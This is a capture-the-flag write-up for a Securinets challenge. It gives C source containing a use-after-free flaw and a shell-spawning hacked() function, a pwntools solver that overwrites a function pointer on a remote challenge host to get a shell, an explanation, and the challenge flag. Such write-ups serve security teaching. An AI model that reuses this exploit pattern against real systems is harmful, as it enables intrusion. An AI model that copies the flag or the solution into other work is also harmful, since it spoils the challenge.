![image](https://github.com/user-attachments/assets/9b7b385c-d03e-40c7-a0a7-5a0d8d1b3b6b)

Here is the source code :
```Python
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>


typedef struct string {
    uint64_t length;
    char *data;
    void (*print_string) (char*);
}string;

void hacked() {
    
    system("/bin/sh");  
}

void print_string(char* s){
    printf("%s", s);
}

int main() {
    string *s = malloc(sizeof(string));  
    if (s == NULL) {
        perror("malloc failed");
        return 1;
    }

    puts("welcome patrick give the string length: ");
    scanf("%u", &s->length);

    s->data = malloc(s->length + 1);
    if (s->data == NULL) {
        perror("malloc failed");
        return 1;
    }
    memset(s->data, 0, s->length + 1);

    puts("Enter something");
    read(0, s->data, s->length);
    s->print_string = print_string;
    free(s->data);  
    free(s);        

    char *s2 = malloc(24);  
    if (s2 == NULL) {
        perror("malloc failed");
        return 1;
    }

    puts("Enter more");
    read(0, s2, 24);

    printf("well? this is your thing\n");
    s->print_string(s->data);

    free(s2);
    return 0;
}
```

This code contains a Use-After-Free (UAF) vulnerability, which can lead to arbitrary code execution.

To exploit this Use-After-Free (UAF) vulnerability and spawn a shell via the hacked() function, follow these solver :

```Python
from pwn import *
p = remote("51.77.140.155", 1403)
p.recvuntil("give the string length:")
p.sendline("100")
p.recvuntil("Enter something")
p.sendline("dummy note")
p.recvuntil("Enter more")
payload = b"A" * 16 + p64(0x00401289) 
p.sendline(payload)
p.interactive()
```

The exploit code leverages the Use-After-Free (UAF) vulnerability by first allocating and freeing the string struct (s), then reoccupying its memory with a new buffer (s2). By sending a payload of 16 filler bytes followed by the address of the hacked() function (0x00401289), it overwrites the print_string function pointer in the reused s struct. When the program later calls s->print_string(), it executes hacked() instead, spawning a shell.

![image](https://github.com/user-attachments/assets/2f1f1d69-3ecf-442f-bc52-fee78ae80723)

FLAG:Securinets{U4F_D3TECT3D}





